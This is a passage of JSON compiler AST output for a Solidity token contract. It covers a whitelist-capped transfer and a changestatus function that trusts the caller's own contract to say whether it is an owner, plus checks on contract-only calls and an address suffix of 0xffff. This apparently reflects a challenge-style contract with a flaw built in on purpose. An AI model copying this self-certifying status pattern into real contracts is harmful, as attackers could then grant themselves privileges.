																	"referencedDeclaration": 600,
																	"src": "3359:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 247,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 246,
																	"name": "sender",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 235,
																	"src": "3369:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "3359:17:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 248,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 1145,
															"src": "3359:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 250,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "3359:29:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3339:49:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 252,
												"nodeType": "ExpressionStatement",
												"src": "3339:49:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 262,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 253,
															"name": "_balances",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 600,
															"src": "3399:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 255,
														"indexExpression": {
															"argumentTypes": null,
															"id": 254,
															"name": "recipient",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 237,
															"src": "3409:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "3399:20:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 260,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 239,
																"src": "3447:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 256,
																	"name": "_balances",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 600,
																	"src": "3422:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 258,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 257,
																	"name": "recipient",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 237,
																	"src": "3432:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "3422:20:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 259,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 1120,
															"src": "3422:24:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 261,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "3422:32:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3399:55:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 263,
												"nodeType": "ExpressionStatement",
												"src": "3399:55:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 267,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "UnaryOperation",
													"operator": "!",
													"prefix": true,
													"src": "3469:19:0",
													"subExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 265,
																"name": "recipient",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 237,
																"src": "3478:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 264,
															"name": "isWhite",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 197,
															"src": "3470:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_view$_t_address_$returns$_t_bool_$",
																"typeString": "function (address) view returns (bool)"
															}
														},
														"id": 266,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "3470:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 278,
												"nodeType": "IfStatement",
												"src": "3465:109:0",
												"trueBody": {
													"id": 277,
													"nodeType": "Block",
													"src": "3490:84:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 273,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"baseExpression": {
																				"argumentTypes": null,
																				"id": 269,
																				"name": "_balances",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 600,
																				"src": "3513:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																					"typeString": "mapping(address => uint256)"
																				}
																			},
																			"id": 271,
																			"indexExpression": {
																				"argumentTypes": null,
																				"id": 270,
																				"name": "recipient",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 237,
																				"src": "3523:9:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			},
																			"isConstant": false,
																			"isLValue": true,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "IndexAccess",
																			"src": "3513:20:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "<=",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 272,
																			"name": "MAXHOLD",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 172,
																			"src": "3537:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "3513:31:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"hexValue": "686f6c64206f766572666c6f77",
																		"id": 274,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "3546:15:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_dbafe53856df6e91b8794d929c0d6eb7ba37e93aa669833912e712eceb5c6d6f",
																			"typeString": "literal_string \"hold overflow\""
																		},
																		"value": "hold overflow"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		{
																			"typeIdentifier": "t_stringliteral_dbafe53856df6e91b8794d929c0d6eb7ba37e93aa669833912e712eceb5c6d6f",
																			"typeString": "literal_string \"hold overflow\""
																		}
																	],
																	"id": 268,
																	"name": "require",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		1244,
																		1245
																	],
																	"referencedDeclaration": 1245,
																	"src": "3505:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (bool,string memory) pure"
																	}
																},
																"id": 275,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "3505:57:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 276,
															"nodeType": "ExpressionStatement",
															"src": "3505:57:0"
														}
													]
												}
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 280,
															"name": "sender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 235,
															"src": "3598:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 281,
															"name": "recipient",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 237,
															"src": "3606:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 282,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 239,
															"src": "3617:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 279,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1084,
														"src": "3589:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 283,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3589:35:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 284,
												"nodeType": "EmitStatement",
												"src": "3584:40:0"
											}
										]
									},
									"documentation": null,
									"id": 286,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 240,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 235,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 286,
												"src": "3244:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 234,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3244:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 237,
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"scope": 286,
												"src": "3269:17:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 236,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3269:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 239,
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"scope": 286,
												"src": "3297:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 238,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3297:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3233:85:0"
									},
									"returnParameters": {
										"id": 241,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3328:0:0"
									},
									"scope": 544,
									"src": "3215:417:0",
									"stateMutability": "nonpayable",
									"superFunction": 809,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 315,
										"nodeType": "Block",
										"src": "3685:157:0",
										"statements": [
											{
												"assignments": [
													292
												],
												"declarations": [
													{
														"constant": false,
														"id": 292,
														"name": "tmp",
														"nodeType": "VariableDeclaration",
														"scope": 315,
														"src": "3696:12:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Changing_$12",
															"typeString": "contract Changing"
														},
														"typeName": {
															"contractScope": null,
															"id": 291,
															"name": "Changing",
															"nodeType": "UserDefinedTypeName",
															"referencedDeclaration": 12,
															"src": "3696:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_Changing_$12",
																"typeString": "contract Changing"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 297,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 294,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1241,
																"src": "3720:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 295,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "3720:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														],
														"id": 293,
														"name": "Changing",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 12,
														"src": "3711:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_contract$_Changing_$12_$",
															"typeString": "type(contract Changing)"
														}
													},
													"id": 296,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3711:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_Changing_$12",
														"typeString": "contract Changing"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3696:35:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"id": 302,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "UnaryOperation",
													"operator": "!",
													"prefix": true,
													"src": "3746:20:0",
													"subExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 300,
																"name": "_owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 288,
																"src": "3759:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 298,
																"name": "tmp",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 292,
																"src": "3747:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Changing_$12",
																	"typeString": "contract Changing"
																}
															},
															"id": 299,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "isOwner",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 11,
															"src": "3747:11:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$_t_bool_$",
																"typeString": "function (address) external returns (bool)"
															}
														},
														"id": 301,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "3747:19:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 314,
												"nodeType": "IfStatement",
												"src": "3742:93:0",
												"trueBody": {
													"id": 313,
													"nodeType": "Block",
													"src": "3768:67:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 311,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 303,
																		"name": "status",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 161,
																		"src": "3783:6:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
																			"typeString": "mapping(address => bool)"
																		}
																	},
																	"id": 306,
																	"indexExpression": {
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 304,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1241,
																			"src": "3790:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 305,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "3790:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "3783:18:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"id": 309,
																			"name": "_owner",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 288,
																			"src": "3816:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"id": 307,
																			"name": "tmp",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 292,
																			"src": "3804:3:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_Changing_$12",
																				"typeString": "contract Changing"
																			}
																		},
																		"id": 308,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "isOwner",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 11,
																		"src": "3804:11:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_external_nonpayable$_t_address_$returns$_t_bool_$",
																			"typeString": "function (address) external returns (bool)"
																		}
																	},
																	"id": 310,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3804:19:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "3783:40:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 312,
															"nodeType": "ExpressionStatement",
															"src": "3783:40:0"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 316,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "changestatus",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 289,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 288,
												"name": "_owner",
												"nodeType": "VariableDeclaration",
												"scope": 316,
												"src": "3662:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 287,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3662:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3661:16:0"
									},
									"returnParameters": {
										"id": 290,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "3685:0:0"
									},
									"scope": 544,
									"src": "3640:202:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 358,
										"nodeType": "Block",
										"src": "3880:235:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															"id": 324,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 320,
																	"name": "tx",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1253,
																	"src": "3899:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_transaction",
																		"typeString": "tx"
																	}
																},
																"id": 321,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "origin",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "3899:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 322,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1241,
																	"src": "3912:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 323,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "3912:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "3899:23:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 319,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "3891:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 325,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3891:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 326,
												"nodeType": "ExpressionStatement",
												"src": "3891:32:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 335,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 333,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"expression": {
																				"argumentTypes": null,
																				"id": 329,
																				"name": "msg",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1241,
																				"src": "3947:3:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_message",
																					"typeString": "msg"
																				}
																			},
																			"id": 330,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"memberName": "sender",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "3947:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address_payable",
																				"typeString": "address payable"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address_payable",
																				"typeString": "address payable"
																			}
																		],
																		"id": 328,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "3942:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": "uint"
																	},
																	"id": 331,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "3942:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "307866666666",
																	"id": 332,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "3961:6:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_65535_by_1",
																		"typeString": "int_const 65535"
																	},
																	"value": "0xffff"
																},
																"src": "3942:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "307866666666",
																"id": 334,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "3971:6:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_65535_by_1",
																	"typeString": "int_const 65535"
																},
																"value": "0xffff"
															},
															"src": "3942:35:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"id": 327,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															1244,
															1245
														],
														"referencedDeclaration": 1244,
														"src": "3934:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
															"typeString": "function (bool) pure"
														}
													},
													"id": 336,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3934:44:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 337,
												"nodeType": "ExpressionStatement",
												"src": "3934:44:0"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 343,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 338,
															"name": "status",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 161,
															"src": "3993:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_bool_$",
																"typeString": "mapping(address => bool)"
															}
														},
														"id": 341,
														"indexExpression": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 339,
																"name": "msg",
